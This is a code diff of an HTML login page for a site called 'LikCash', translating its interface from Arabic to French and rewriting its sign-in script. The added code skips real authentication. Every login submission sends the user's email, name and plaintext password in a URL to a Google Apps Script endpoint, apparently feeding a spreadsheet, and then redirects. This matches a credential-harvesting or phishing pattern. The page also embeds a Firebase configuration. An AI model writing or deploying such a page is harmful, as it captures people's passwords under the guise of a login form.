@@ -1,9 +1,9 @@
 <!DOCTYPE html> 
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LikCash | الدخول الذكي</title>
+    <title>LikCash | Authentification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@700;900&display=swap" rel="stylesheet">
     
@@ -11,144 +11,161 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
 
     <style>
-        body { font-family: 'Tajawal', sans-serif; background: #ffffff; margin: 0; }
+        body { font-family: 'Tajawal', sans-serif; background: #fdfdfd; }
         .hidden { display: none !important; }
-        .input-pro { background: #f8fafc; border: 2px solid #e2e8f0; transition: all 0.3s ease; font-weight: 900; }
-        .input-pro:focus { border-color: #2563eb; background: #fff; outline: none; box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
-        .loader { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
+        /* تصميم الحقول بشكل عصري */
+        .input-field { 
+            background: #f8fafc; 
+            border: 2px solid #e2e8f0; 
+            transition: all 0.3s ease; 
+            font-weight: 700;
+            text-align: left;
+        }
+        .input-field:focus { 
+            border-color: #2563eb; 
+            background: #fff; 
+            outline: none; 
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); 
+        }
+        /* لودر التحميل */
+        .loader { 
+            width: 20px; height: 20px; 
+            border: 3px solid rgba(255,255,255,0.3); 
+            border-top-color: #fff; 
+            border-radius: 50%; 
+            animation: spin 0.8s linear infinite; 
+            display: none; 
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        * { font-weight: 900 !important; }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-6 bg-slate-50">
+<body class="min-h-screen flex items-center justify-center p-4 bg-slate-50">
 
-    <div id="customModal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-[100] p-4 text-center">
-        <div class="bg-white rounded-[2.5rem] max-w-xs w-full p-8 shadow-2xl">
-            <h3 id="modalTitle" class="text-xl mb-2 text-slate-900"></h3>
+    <div id="customModal" class="hidden fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-[100] p-4">
+        <div class="bg-white rounded-[2rem] max-w-xs w-full p-8 shadow-2xl text-center">
+            <h3 id="modalTitle" class="text-xl mb-2 text-slate-900 font-black"></h3>
             <p id="modalMessage" class="text-slate-500 text-sm mb-6"></p>
-            <button onclick="closeModal()" class="w-full bg-blue-600 text-white py-4 rounded-2xl italic">موافق</button>
+            <button onclick="closeModal()" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold">OK</button>
         </div>
     </div>
 
-    <div class="max-w-md w-full bg-white rounded-[3rem] p-10 shadow-2xl border border-slate-100 text-center">
-        <img src="https://i.postimg.cc/zffZkRtk/31998-removebg-preview.png" alt="LikCash" class="h-12 mx-auto mb-8">
-        <h2 id="title" class="text-2xl text-slate-900 mb-6 italic text-blue-600 uppercase">تسجيل الدخول</h2>
+    <div class="max-w-md w-full bg-white rounded-[2.5rem] p-8 shadow-xl border border-slate-100 text-center">
+        <img src="https://i.postimg.cc/zffZkRtk/31998-removebg-preview.png" alt="LikCash" class="h-10 mx-auto mb-6">
+        
+        <h2 id="title" class="text-2xl text-slate-800 mb-8 font-black italic uppercase text-blue-600">Connexion</h2>
 
         <form id="authForm" onsubmit="handleAction(event)" class="space-y-4 text-right">
             <div id="name-field" class="hidden space-y-1">
-                <label class="text-[10px] text-slate-400 mr-2 uppercase">الاسم الكامل</label>
-                <input type="text" id="userName" placeholder="الاسم الكامل" class="input-pro w-full px-5 py-4 rounded-2xl">
+                <label class="text-[10px] text-slate-400 mr-2 font-bold">NOM COMPLET</label>
+                <input type="text" id="userName" placeholder="Votre nom" class="input-field w-full px-5 py-3.5 rounded-2xl">
             </div>
 
             <div class="space-y-1">
-                <label class="text-[10px] text-slate-400 mr-2 uppercase">البريد الالكتروني</label>
-                <input type="email" id="userEmail" autocomplete="username" placeholder="mail@example.com" class="input-pro w-full px-5 py-4 rounded-2xl text-left font-sans" required>
+                <label class="text-[10px] text-slate-400 mr-2 font-bold">EMAIL</label>
+                <input type="email" id="userEmail" placeholder="mail@example.com" class="input-field w-full px-5 py-3.5 rounded-2xl font-sans" required>
             </div>
 
             <div class="space-y-1">
-                <label class="text-[10px] text-slate-400 mr-2 uppercase">كلمة المرور</label>
-                <input type="password" id="userPass" autocomplete="current-password" placeholder="••••••••" class="input-pro w-full px-5 py-4 rounded-2xl text-left" required>
+                <label class="text-[10px] text-slate-400 mr-2 font-bold">MOT DE PASSE</label>
+                <input type="password" id="userPass" placeholder="••••••••" class="input-field w-full px-5 py-3.5 rounded-2xl" required>
             </div>
             
-            <button type="submit" id="btn1" class="w-full bg-slate-900 text-white py-5 rounded-2xl text-lg flex items-center justify-center gap-3 hover:bg-blue-600 transition-all shadow-xl mt-4">
-                <span id="text1">دخول للنظام</span>
-                <div id="load1" class="loader"></div>
+            <button type="submit" id="mainBtn" class="w-full bg-slate-900 text-white py-4 rounded-2xl text-lg flex items-center justify-center gap-3 hover:bg-blue-600 transition-all shadow-lg mt-4">
+                <span id="btnText">SE CONNECTER</span>
+                <div id="btnLoader" class="loader"></div>
             </button>
         </form>
 
-        <div class="relative my-6 flex items-center justify-center">
+        <div class="relative my-8 flex items-center justify-center">
             <div class="absolute inset-0 flex items-center"><span class="w-full border-t border-slate-100"></span></div>
-            <span class="relative bg-white px-4 text-slate-400 text-[10px] uppercase font-bold italic">أو عبر جوجل</span>
+            <span class="relative bg-white px-4 text-slate-400 text-[10px] font-bold">OU CONTINUER AVEC</span>
         </div>
 
-        <button onclick="loginWithGoogle()" class="flex items-center justify-center gap-3 w-full border-2 border-slate-100 py-4 rounded-2xl hover:bg-slate-50 transition-all">
-            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-5">
-            <span class="text-[11px] uppercase font-black">تسجيل عبر حساب GOOGLE</span>
+        <button onclick="loginWithGoogle()" class="flex items-center justify-center gap-3 w-full border-2 border-slate-100 py-3.5 rounded-2xl hover:bg-slate-50 transition-all group">
+            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-5 group-hover:scale-110 transition-transform">
+            <span class="text-[11px] font-black text-slate-700">GOOGLE ACCOUNT</span>
         </button>
 
-        <div class="text-center mt-6 pt-4 border-t border-slate-50">
-            <span id="toggle-text" class="text-slate-400 text-xs">ليس لديك حساب؟</span>
-            <button onclick="toggleSignUp()" id="toggle-btn" class="text-blue-600 text-[11px] mr-1 uppercase font-black">انشاء حساب</button>
+        <div class="mt-8 pt-4 border-t border-slate-50">
+            <p id="toggle-text" class="text-slate-400 text-xs font-bold">Pas encore de compte ?</p>
+            <button onclick="toggleMode()" id="toggle-btn" class="text-blue-600 text-[11px] font-black uppercase mt-1">Créer un compte</button>
         </div>
     </div>
 
     <script>
-        // إعدادات Firebase الحقيقية من الصورة
+        // 1. إعدادات Firebase (المعلومات اللي فالتصويرة)
         const firebaseConfig = {
             apiKey: "AIzaSyBP77A_0dc3Z1H6jrUmhtapLF1w0Gbe4B8",
             authDomain: "likcash-auth.firebaseapp.com",
             projectId: "likcash-auth",
             storageBucket: "likcash-auth.firebasestorage.app",
             messagingSenderId: "19126222896",
-            appId: "1:19126222896:web:0a6416948afa024e53adf5",
-            measurementId: "G-Q4Z0JB801H"
+            appId: "1:19126222896:web:0a6416948afa024e53adf5"
         };
-
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
 
-        // رابط Apps Script الجديد الخاص بك
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwFKg9j45T-KPsg6MHTnPoZ28WWmzf5-QM9zea0ra5HsK0TPTbXDHD8M_wyWJGjyo7MRw/exec";
+        // 2. رابط السكربت الجديد ديالك
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyZ80dqN4q8EyK9mTGmMl7YRN02ur5MnGLOvCscz77DDVK8B-zhq4Nx1ehS402luraYNw/exec";
         
         let mode = "login";
 
-        function toggleSignUp() {
+        // تبديل الواجهة
+        function toggleMode() {
             mode = (mode === "signup") ? "login" : "signup";
-            document.getElementById('title').innerText = mode === "signup" ? "انشاء حساب جديد" : "تسجيل الدخول";
+            document.getElementById('title').innerText = mode === "signup" ? "INSCRIPTION" : "CONNEXION";
             document.getElementById('name-field').classList.toggle('hidden', mode !== "signup");
-            document.getElementById('text1').innerText = mode === "signup" ? "تسجيل الآن" : "دخول للنظام";
-            document.getElementById('toggle-btn').innerText = mode === "signup" ? "دخول" : "انشاء حساب";
+            document.getElementById('btnText').innerText = mode === "signup" ? "S'INSCRIRE" : "SE CONNECTER";
+            document.getElementById('toggle-text').innerText = mode === "signup" ? "Déjà un compte ?" : "Pas encore de compte ?";
+            document.getElementById('toggle-btn').innerText = mode === "signup" ? "Connexion" : "Créer un compte";
         }
 
-        function showMsg(title, message) {
-            document.getElementById('modalTitle').innerText = title;
-            document.getElementById('modalMessage').innerText = message;
+        // إغلاق التنبيه
+        function closeModal() { document.getElementById('customModal').classList.add('hidden'); }
+        function showMsg(t, m) { 
+            document.getElementById('modalTitle').innerText = t;
+            document.getElementById('modalMessage').innerText = m;
             document.getElementById('customModal').classList.remove('hidden');
         }
 
-        function closeModal() { document.getElementById('customModal').classList.add('hidden'); }
-
-        // الدخول أو التسجيل العادي
+        // --- الدخول العادي (Sheets Only) ---
         async function handleAction(event) {
             event.preventDefault();
-            const email = document.getElementById('userEmail').value.trim();
-            const pass = document.getElementById('userPass').value.trim();
-            const name = document.getElementById('userName').value.trim() || email.split('@')[0];
+            const email = document.getElementById('userEmail').value;
+            const pass = document.getElementById('userPass').value;
+            const name = document.getElementById('userName').value || email.split('@')[0];
 
-            document.getElementById('text1').classList.add('hidden');
-            document.getElementById('load1').style.display = "block";
+            document.getElementById('btnText').classList.add('hidden');
+            document.getElementById('btnLoader').style.display = "block";
 
             try {
-                if(mode === "login") {
-                    await auth.signInWithEmailAndPassword(email, pass);
-                } else {
-                    await auth.createUserWithEmailAndPassword(email, pass);
-                    // حفظ البيانات في الجدول عند التسجيل الجديد
-                    fetch(`${SCRIPT_URL}?action=saveData&email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}&pass=${encodeURIComponent(pass)}`);
-                }
+                // إرسال للجدول فقط (MANUEL)
+                await fetch(`${SCRIPT_URL}?action=saveData&email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}&pass=${encodeURIComponent(pass)}`);
+                
                 sessionStorage.setItem('userEmail', email);
                 window.location.replace("w/check.html");
-            } catch (error) {
-                showMsg("تنبيه", "البريد أو كلمة المرور غير صحيحة");
+            } catch (e) {
+                showMsg("Erreur", "Problème de connexion");
             } finally {
-                document.getElementById('text1').classList.remove('hidden');
-                document.getElementById('load1').style.display = "none";
+                document.getElementById('btnText').classList.remove('hidden');
+                document.getElementById('btnLoader').style.display = "none";
             }
         }
 
-        // الدخول بجوجل
+        // --- الدخول بجوجل (Firebase + Sheets) ---
         async function loginWithGoogle() {
             const provider = new firebase.auth.GoogleAuthProvider();
             try {
                 const result = await auth.signInWithPopup(provider);
                 const user = result.user;
-                // إرسال بيانات جوجل للجدول
-                fetch(`${SCRIPT_URL}?action=saveData&email=${encodeURIComponent(user.email)}&name=${encodeURIComponent(user.displayName)}&pass=GOOGLE_LOGIN`);
+                
+                // إرسال للجدول (GOOGLE)
+                fetch(`${SCRIPT_URL}?action=saveData&email=${encodeURIComponent(user.email)}&name=${encodeURIComponent(user.displayName)}&pass=GOOGLE_AUTH`);
                 
                 sessionStorage.setItem('userEmail', user.email);
                 window.location.replace("w/check.html");
-            } catch (error) {
-                showMsg("خطأ", "فشل الاتصال بجوجل. تأكد من تفعيل نطاق الموقع في Firebase");
+            } catch (e) {
+                showMsg("Erreur", "Échec de l'authentification Google");
             }
         }
     </script>
